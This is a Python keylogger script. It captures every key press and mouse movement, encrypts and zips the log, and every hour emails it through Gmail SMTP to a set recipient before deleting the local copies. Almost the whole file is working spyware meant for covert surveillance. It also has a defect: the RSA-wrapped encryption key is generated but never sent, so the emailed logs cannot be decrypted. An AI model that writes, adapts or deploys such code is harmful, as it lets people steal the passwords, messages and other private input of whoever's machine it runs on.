import keyboard
import os
import time
import smtplib
import zipfile
import pyautogui
import threading
from cryptography.fernet import Fernet
from datetime import datetime
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
from email.mime.text import MIMEText
from pynput.mouse import Listener as MouseListener
from pynput import mouse
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives import hashes

# Email configuration (replace with your own credentials)
emailUser = 'insertEmail'
emailPass = 'insertPassword'
emailRecipient = 'insertEmailRecipient'

logFile = 'myLogFile.txt'
encryptedLogFile = 'encryptedLogFile.txt'
zipFile = 'compressedLog.zip'
publicRSAKey = 'public_key.pem'
privateRSAKey = 'private_key.pem'

# Generate RSA key pair for asymmetric encryption
def generateRSAKeyPair():
    privateKey = rsa.generate_private_key(
        public_exponent=65537,
        key_size=2048
    )
    publicKey = privateKey.public_key()
    
    # Save the private key
    with open(privateRSAKey, 'wb') as privFile:
        privFile.write(privateKey.private_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PrivateFormat.TraditionalOpenSSL,
            encryption_algorithm=serialization.NoEncryption()
        ))
    
    # Save the public key
    with open(publicRSAKey, 'wb') as pubFile:
        pubFile.write(publicKey.public_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PublicFormat.SubjectPublicKeyInfo
        ))

# Load the RSA public key from the file
def loadPublicRSAKey():
    with open(publicRSAKey, 'rb') as keyFile:
        return serialization.load_pem_public_key(keyFile.read())

# Encrypt the symmetric key using RSA public key
def encryptFernetKeyWithRSA(fernetKey, publicKey):
    return publicKey.encrypt(
        fernetKey,
        padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None
        )
    )

# Generate a Fernet symmetric encryption key
def generateFernetKey():
    return Fernet.generate_key()

# Encrypt the log file using the Fernet symmetric key
def encryptLogFile(fernetKey):
    cipher = Fernet(fernetKey)
    with open(logFile, 'rb') as log:
        logData = log.read()
    encryptedData = cipher.encrypt(logData)
    
    with open(encryptedLogFile, 'wb') as encryptedFile:
        encryptedFile.write(encryptedData)

# Compress the encrypted log file into a zip file
def compressEncryptedLog():
    with zipfile.ZipFile(zipFile, 'w') as zipArchive:
        zipArchive.write(encryptedLogFile)

# Send the compressed log file via email
def sendLogEmail():
    msg = MIMEMultipart()
    msg['From'] = emailUser
    msg['To'] = emailRecipient
    msg['Subject'] = 'Keylogger Log'

    # Add a simple message body
    body = "Attached is the encrypted keylogger log."
    msg.attach(MIMEText(body, 'plain'))

    # Attach the compressed log file
    with open(zipFile, 'rb') as attachment:
        part = MIMEBase('application', 'octet-stream')
        part.set_payload(attachment.read())
        encoders.encode_base64(part)
        part.add_header('Content-Disposition', f'attachment; filename= {zipFile}')
        msg.attach(part)

    # Send the email using SMTP
    server = smtplib.SMTP('smtp.gmail.com', 587)
    server.starttls()
    server.login(emailUser, emailPass)
    emailBody = msg.as_string()
    server.sendmail(emailUser, emailRecipient, emailBody)
    server.quit()

# Get the current timestamp for logging purposes
def getCurrentTimestamp():
    return datetime.now().strftime('%Y-%m-%d %H:%M:%S')

# Format the key press event for better readability in the log
def formatKeyPressEvent(event):
    if event.name in keyboard.all_modifiers:
        return f"[MODIFIER] {event.name.upper()}"
    elif len(event.name) > 1:
        return f"[SPECIAL] {event.name.upper()}"
    else:
        return f"[KEY] {event.name}"

# Function to log key press events
def logKeyPress(event):
    try:
        with open(logFile, 'a') as log:
            timestamp = getCurrentTimestamp()
            keyInfo = formatKeyPressEvent(event)
            log.write(f'{timestamp} - {keyInfo}\n')
    except Exception as e:
        print(f"Error logging key: {e}")

# Function to log mouse movements
def logMouseMovement(x, y):
    try:
        with open(logFile, 'a') as log:
            timestamp = getCurrentTimestamp()
            log.write(f'{timestamp} - [MOUSE] Moved to ({x}, {y})\n')
    except Exception as e:
        print(f"Error logging mouse movement: {e}")

# Thread function to periodically send the log via email in the background
def backgroundEmailSender():
    while True:
        time.sleep(3600)  # Sends the log every hour
        fernetKey = generateFernetKey()
        publicKey = loadPublicRSAKey()
        encryptedKey = encryptFernetKeyWithRSA(fernetKey, publicKey)
        encryptLogFile(fernetKey)
        compressEncryptedLog()
        sendLogEmail()
        os.remove(logFile)
        os.remove(encryptedLogFile)

# Start keylogger to log all key presses
keyboard.on_press(logKeyPress)

# Start mouse listener to log mouse movements
mouseListener = MouseListener(on_move=logMouseMovement)
mouseListener.start()

# Generate RSA keys if they don't exist
if not os.path.exists(privateRSAKey) or not os.path.exists(publicRSAKey):
    generateRSAKeyPair()

# Start background thread for sending logs via email
threading.Thread(target=backgroundEmailSender, daemon=True).start()

# Wait indefinitely until interrupted manually
keyboard.wait()
